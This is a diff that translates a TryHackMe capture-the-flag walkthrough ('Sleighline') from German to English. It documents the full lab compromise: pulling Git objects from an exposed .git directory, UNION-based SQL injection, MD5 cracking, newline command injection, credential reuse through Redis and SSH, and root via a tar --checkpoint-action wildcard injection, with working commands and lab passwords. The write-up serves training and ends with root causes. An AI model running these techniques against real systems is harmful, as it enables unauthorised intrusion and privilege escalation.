@@ -1,38 +1,38 @@
 # TryHackMe: Sleighline — Walkthrough
 
-> **Spoilerwarnung:** Dieser Bericht beschreibt den vollständigen Weg von der Webanwendung bis zu Root. Alle Flags sind im Text ausgelassen und in den Screenshots mit schwarzen Balken geschwärzt.
+> **Spoiler warning:** This walkthrough covers the complete path from the web application to root. Flag values are omitted from the text and covered with solid black bars in the screenshots.
 
-[Zum Room](https://tryhackme.com/room/sleighline)
+[Open the room](https://tryhackme.com/room/sleighline)
 
-## Kurzüberblick
+## At a glance
 
-| Punkt | Ergebnis |
+| Item | Finding |
 | --- | --- |
-| Schwierigkeitsgrad | Medium |
-| Offene TCP-Ports | 22 (SSH), 80 (HTTP) |
-| Einstieg | Öffentlich erreichbares `.git` und SQL-Injection im Wunsch-Tracking |
-| Web-Zugriff | `santa_ops` nach Crack eines MD5-Hashes |
-| Code-Ausführung | Zeilenumbruch im Feld `style` des Geschenk-Tag-Generators |
-| Interner Dienst | Route Planner auf Port 8080 |
-| Weiterer Zugriff | Redis-Eintrag mit SSH-Zugang für `jingle` |
-| Privilegienerweiterung | `sudo`-Skript mit GNU-tar-Wildcard-Injection |
+| Difficulty | Medium |
+| Open TCP ports | 22 (SSH), 80 (HTTP) |
+| Entry point | Exposed `.git` directory and SQL injection in wish tracking |
+| Staff access | `santa_ops` account after cracking an MD5 hash |
+| Code execution | Newline injection in the gift tag generator's `style` field |
+| Internal service | Route planner on port 8080 |
+| Next account | Redis entry containing SSH credentials for `jingle` |
+| Privilege escalation | GNU tar wildcard injection in a `sudo`-allowed script |
 
-![Room und gestartete Maschinen](images/01-room-overview.jpg)
+![Room overview and running machines](images/01-room-overview.jpg)
 
-**Laborhinweis:** Die Zieladresse wird bei jedem Start neu vergeben. Bei dieser erneuten Prüfung war sie `10.112.129.38`. Die in einer alten Git-Notiz beschriebene zweite Netzwerkschnittstelle war auf dieser Instanz nicht vorhanden. Der Planner war aus dem Kontext der kompromittierten Webanwendung über `127.0.0.1:8080` erreichbar; Redis lauschte auf `127.0.0.1:6379`. SSH zu `jingle` lief über die aktuelle Zieladresse. Die Git-Notiz ist daher ein Hinweis auf die beabsichtigte Architektur, kein Beweis für einen tatsächlich nötigen Tunnel in dieser Instanz.
+**Lab note:** The target IP changes when the machine is restarted. During this verification it was `10.112.129.38`. An old Git deployment note described a second network interface, but this instance did not have one. The planner was reachable from the compromised web application's context at `127.0.0.1:8080`, while Redis listened at `127.0.0.1:6379`. SSH access for `jingle` used the current target IP. The note therefore describes the intended architecture, not a pivot that was necessary on this instance.
 
 ## 1. Reconnaissance
 
-Ein vollständiger TCP-Scan fand ausschließlich SSH und HTTP:
+A full TCP scan found only SSH and HTTP:
 
 ```bash
-export T=<ZIEL-IP>
+export T=10.112.129.38  # Replace with your current target IP
 nmap -p- --min-rate 1000 "$T"
 ```
 
-![Nmap: Port 22 und 80](images/02-portscan.jpg)
+![Nmap showing ports 22 and 80](images/02-portscan.jpg)
 
-Auf Port 80 lag das Wishlist Portal. Zusätzlich war das Git-Verzeichnis über HTTP erreichbar: `/.git/HEAD` verwies auf `refs/heads/main`, und die Ref lieferte einen Commit-Hash. Ein normaler `git clone` über HTTP funktionierte hier nicht, weil die Git-Transport-Endpunkte fehlten. Die Git-Objekte selbst ließen sich jedoch einzeln abrufen und mit `git cat-file` auswerten.
+Port 80 hosted the Wishlist Portal. Its Git directory was also accessible over HTTP: `/.git/HEAD` pointed to `refs/heads/main`, and that ref returned a commit hash. A normal HTTP `git clone` failed because the Git transport endpoints were unavailable. Individual Git objects could still be downloaded and inspected with `git cat-file`.
 
 ```bash
 curl -s "http://$T/.git/HEAD"
@@ -41,25 +41,27 @@ git init -q recovered
 cd recovered
 fetch_object() {
   hash=$1
-  mkdir -p ".git/objects/${hash:0:2}"
-  curl -fsS "http://$T/.git/objects/${hash:0:2}/${hash:2}" \
-    -o ".git/objects/${hash:0:2}/${hash:2}"
+  prefix=$(printf '%s' "$hash" | cut -c1-2)
+  suffix=$(printf '%s' "$hash" | cut -c3-)
+  mkdir -p ".git/objects/$prefix"
+  curl -fsS "http://$T/.git/objects/$prefix/$suffix" \
+    -o ".git/objects/$prefix/$suffix"
 }
 fetch_object "$commit"
 git cat-file -p "$commit"
-# Parent-Commit und die angezeigten Tree-/Blob-Hashes ebenso abrufen.
-# In der alten Tree-Version liegt notes/DEPLOY.md.
+# Fetch the parent commit and the tree/blob hashes shown by git cat-file.
+# The older tree contains notes/DEPLOY.md.
 ```
 
-![Öffentliches Git-Ref](images/03-git-exposure.jpg)
+![Publicly accessible Git ref](images/03-git-exposure.jpg)
 
-In der Historie lag die gelöschte Datei `notes/DEPLOY.md`. Sie enthielt die erste Flag, einen Hinweis auf `/app/config.ini` und die Adresse des Route Planners. Die Flag ist im Screenshot geschwärzt.
+The Git history contained a deleted file, `notes/DEPLOY.md`. It held the first flag, a reference to `/app/config.ini`, and the route planner address. The flag is blacked out in the screenshot.
 
-![Gelöschte Deployment-Notiz; Flag geschwärzt](images/04-git-history.jpg)
+![Deleted deployment note with the flag redacted](images/04-git-history.jpg)
 
-## 2. SQL-Injection und Staff-Zugang
+## 2. SQL injection and staff access
 
-Die Tracking-Funktion übernahm den Parameter `id` auf `/track` in eine SQL-Abfrage. Ein `ORDER BY`-Test zeigte: Position 4 war gültig, Position 5 erzeugte einen Datenbankfehler. Die Abfrage lieferte somit **vier Spalten**.
+The tracking endpoint `/track` passed its `id` parameter into a SQL query. An `ORDER BY` test succeeded for position 4; position 5 produced a database error. The query therefore returned **four columns**.
 
 ```bash
 for n in 4 5; do
@@ -67,7 +69,7 @@ for n in 4 5; do
 done
 ```
 
-Anschließend lieferte eine `UNION SELECT`-Abfrage Daten aus der Tabelle `staff`. `group_concat` fasste die Zeilen in der zweiten Ausgabespalte zusammen; `||` verknüpfte in der verwendeten Datenbank die Werte.
+A `UNION SELECT` then returned rows from the `staff` table. `group_concat` combined the rows in the second output column, and `||` concatenated the values.
 
 ```bash
 curl -sG --data-urlencode \
@@ -75,27 +77,27 @@ curl -sG --data-urlencode \
   "http://$T/track"
 ```
 
-Für `santa_ops` wurde dabei ein Raw-MD5-Hash sichtbar.
+This exposed a raw MD5 hash for `santa_ops`.
 
-![ORDER BY 4 erfolgreich, ORDER BY 5 mit Fehler](images/05-sql-columns.jpg)
+![ORDER BY 4 succeeds and ORDER BY 5 fails](images/05-sql-columns.jpg)
 
-Der Hash `3b9787927ecbf1b5a270ce1ff8566872` ließ sich mit John und `rockyou.txt` als `snowball` auflösen:
+John cracked the hash `3b9787927ecbf1b5a270ce1ff8566872` with `rockyou.txt`, yielding `snowball`:
 
 ```bash
-printf '%s\n' 'santa_ops:3b9787927ecbf1b5a270ce1ff8566872' > hashes.txt
+printf '%s\n' '3b9787927ecbf1b5a270ce1ff8566872' > hashes.txt
 john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 john --show --format=Raw-MD5 hashes.txt
 ```
 
-![John findet das Staff-Passwort](images/06-admin-hash.jpg)
+![John finding the staff password](images/06-admin-hash.jpg)
 
-Mit `santa_ops:snowball` gelang die Anmeldung im Staff-Bereich. Dort lag die Operations-Flag und der Geschenk-Tag-Generator.
+Signing in as `santa_ops:snowball` opened the staff console. It contained the operations flag and the gift tag generator.
 
-![Staff-Konsole; Flag geschwärzt](images/07-admin-console.jpg)
+![Staff console with the flag redacted](images/07-admin-console.jpg)
 
-## 3. Command Injection als `elf`
+## 3. Command injection as `elf`
 
-Der Tag-Generator übernahm `style` in einen Shell-Befehl. Ein URL-kodierter Zeilenumbruch beendete das erwartete Argument; `#` kommentierte den Rest aus. Die folgende Anfrage demonstriert die Ausführung von `id`:
+The tag generator inserted the `style` value into a shell command. A URL-encoded newline ended the expected argument, and `#` commented out the rest. With an authenticated staff session in `cookies.txt`, this request demonstrates command execution:
 
 ```bash
 curl -s -b cookies.txt \
@@ -104,19 +106,19 @@ curl -s -b cookies.txt \
   "http://$T/admin/tag"
 ```
 
-Die Ausgabe zeigte `uid=113(elf)`. Über denselben Mechanismus ließ sich `/home/elf/flag.txt` lesen.
+The response showed `uid=113(elf)`. The same injection could read `/home/elf/flag.txt`.
 
-![Befehlsausführung als elf](images/08-command-execution.jpg)
+![Command execution as elf](images/08-command-execution.jpg)
 
-![Elf-Flag geschwärzt](images/09-elf-flag.jpg)
+![Elf flag redacted](images/09-elf-flag.jpg)
 
-`ss -tln` zeigte den Planner auf Port **8080** und Redis auf **6379**. Redis war an die Loopback-Adresse gebunden. Die Web-Code-Ausführung reichte aus, um beide Dienste vom Zielsystem aus anzusprechen.
+`ss -tln` showed the planner on port **8080** and Redis on **6379**. Redis was bound to loopback. Code execution in the web application's context was enough to reach both services from the target.
 
-![Interne Dienste auf 8080 und 6379](images/10-internal-services.jpg)
+![Planner and Redis listening on ports 8080 and 6379](images/10-internal-services.jpg)
 
-## 4. Planner und Manifest
+## 4. Planner and manifest
 
-In `/app/config.ini` stand der Service-Zugang `portal-sync:Tinsel-Sync-2026!`. Die Anmeldung am Planner über `127.0.0.1:8080/login` lieferte einen Session-Cookie und leitete nach `/manifest` weiter. Die Befehle wurden über die zuvor bestätigte Code-Ausführung im Kontext von `elf` ausgeführt:
+`/app/config.ini` contained the service credentials `portal-sync:Tinsel-Sync-2026!`. Logging in to the planner at `127.0.0.1:8080/login` returned a session cookie and redirected to `/manifest`. These commands ran on the target through the previously confirmed injection as `elf`:
 
 ```bash
 curl -si -c /tmp/routecookies \
@@ -127,43 +129,43 @@ curl -si -c /tmp/routecookies \
 curl -s -b /tmp/routecookies http://127.0.0.1:8080/manifest
 ```
 
-Das Manifest enthielt eine weitere Flag.
+The manifest contained another flag.
 
-![Manifest-Flag geschwärzt](images/11-manifest-flag.jpg)
+![Manifest flag redacted](images/11-manifest-flag.jpg)
 
-Die Seite `/maintenance` nannte den Redis-Host, Port und das Passwort `Frosty-Cache-77`. Eine Notiz erklärte außerdem, dass der Workshop-Zugang vorübergehend im Cache gespeichert sei.
+The `/maintenance` page listed the Redis host, port, and password `Frosty-Cache-77`. A note explained that the workshop credentials had been stored temporarily in the cache.
 
-![Wartungsnotiz zum Cache](images/12-maintenance-note.jpg)
+![Maintenance note pointing to the cache](images/12-maintenance-note.jpg)
 
-## 5. Redis zu SSH
+## 5. Redis to SSH
 
-Mit dem Redis-Passwort ließ sich der Schlüssel `maint:workshop-host` finden. `HGETALL` zeigte den SSH-Benutzer `jingle` und das Passwort `Gingerbread-Sleigh-1225`:
+The Redis password allowed enumeration of the key `maint:workshop-host`. `HGETALL` revealed the SSH user `jingle` and password `Gingerbread-Sleigh-1225`:
 
 ```bash
 redis-cli -a 'Frosty-Cache-77' SCAN 0
 redis-cli -a 'Frosty-Cache-77' HGETALL maint:workshop-host
 ```
 
-![Redis-Schlüssel](images/13-redis-key.jpg)
+![Redis key](images/13-redis-key.jpg)
 
-![Redis-Eintrag mit Workshop-Zugang](images/14-redis-entry.jpg)
+![Redis entry containing the workshop credentials](images/14-redis-entry.jpg)
 
-SSH auf Port 22 akzeptierte diese Zugangsdaten. Im Home-Verzeichnis von `jingle` lag die User-Flag.
+SSH on port 22 accepted those credentials. The user flag was in `jingle`'s home directory.
 
 ```bash
 ssh jingle@"$T"
 cat ~/user.txt
 ```
 
-![User-Flag geschwärzt](images/16-user-flag.jpg)
+![User flag redacted](images/16-user-flag.jpg)
 
-## 6. Privilegienerweiterung mit tar
+## 6. Privilege escalation with tar
 
-`sudo -l` erlaubte `jingle`, `/usr/local/bin/wrap-gifts` ohne Passwort als Root auszuführen. Das Skript wechselte nach `/home/jingle/gifts` und rief dort `tar czf /var/backups/gifts.tgz *` auf. Weil `*` durch die Shell in Dateinamen aufgelöst wird, kann ein Dateiname mit `--` für `tar` wie eine Option aussehen.
+`sudo -l` showed that `jingle` could run `/usr/local/bin/wrap-gifts` as root without a password. The script changed into `/home/jingle/gifts` and ran `tar czf /var/backups/gifts.tgz *`. The shell expands `*` to user-controlled filenames; names beginning with `--` can then be interpreted as tar options.
 
-![Sudo-Regel und verwundbares Skript](images/15-sudo-script.jpg)
+![Sudo rule and vulnerable script](images/15-sudo-script.jpg)
 
-Zwei vom Benutzer kontrollierte Dateien lieferten `--checkpoint=1` und `--checkpoint-action=exec=sh readroot.sh`. Das kleine Skript schrieb einen Root-`id`-Beleg und die Root-Flag in Dateien, die `jingle` danach lesen konnte. `chmod 644` war nötig, weil `wrap-gifts` `umask 077` setzt.
+Two files supplied `--checkpoint=1` and `--checkpoint-action=exec=sh readroot.sh`. The script wrote proof of root execution and the root flag to files that `jingle` could read afterward. `chmod 644` was necessary because `wrap-gifts` set `umask 077`.
 
 ```bash
 echo 'id > /home/jingle/root-id.txt; cat /root/root.txt > /home/jingle/rootflag.txt; chmod 644 /home/jingle/root-id.txt /home/jingle/rootflag.txt' > ~/gifts/readroot.sh
@@ -174,16 +176,16 @@ sudo /usr/local/bin/wrap-gifts
 cat /home/jingle/root-id.txt /home/jingle/rootflag.txt
 ```
 
-![Die beiden Tar-Argumentdateien](images/16-tar-payload.jpg)
+![The two tar argument files](images/16-tar-payload.jpg)
 
-Der abschließende Beleg zeigte `uid=0(root)` und die geschwärzte Root-Flag.
+The final proof showed `uid=0(root)` and the redacted root flag.
 
-![Root-Ausführung; Flag geschwärzt](images/17-root-proof.jpg)
+![Root execution with the flag redacted](images/17-root-proof.jpg)
 
-## Ergebnis und Ursachen
+## Outcome and root causes
 
-Der Room war mit allen 12 Aufgaben abgeschlossen. Die sechs Flag-Werte sind bewusst nicht veröffentlicht. Die übrigen Antworten waren: **2** offene TCP-Ports, **4** SQL-Spalten, Staff-Passwort `snowball`, Web-Benutzer `elf`, Planner-Port **8080**, Redis-Schlüssel `maint:workshop-host`.
+All 12 room tasks were completed. The six flag values are intentionally withheld. The remaining answers were: **2** open TCP ports, **4** SQL columns, staff password `snowball`, web user `elf`, planner port **8080**, and Redis key `maint:workshop-host`.
 
-Die Angriffskette beruhte auf mehreren unabhängig vermeidbaren Fehlern: öffentlich lesbarem Git-Verzeichnis, unsicherer SQL-Abfrage, schwachem MD5-Passwort, Shell-Interpolation einer Formulareingabe, Zugangsdaten in Konfigurationsdateien und Redis sowie einem privilegierten `tar`-Aufruf mit nutzerkontrolliertem Wildcard-Argument.
+The chain relied on several separate issues: an exposed Git directory, an unsafe SQL query, a weak MD5 password, shell interpolation of form input, credentials stored in configuration and Redis, and a privileged tar invocation using a user-controlled wildcard argument.
 
-**Bildprüfung:** Die Original-Screenshots mit Flags befinden sich nicht in diesem Repository. Alle hier eingebundenen Bilder wurden vor dem Upload kontrolliert; jede sichtbare Flag ist mit einem deckenden schwarzen Rechteck geschwärzt.
+**Screenshot review:** The original screenshots containing flags are not in this repository. Every published image was checked before upload, and each visible flag is covered by a solid black rectangle.
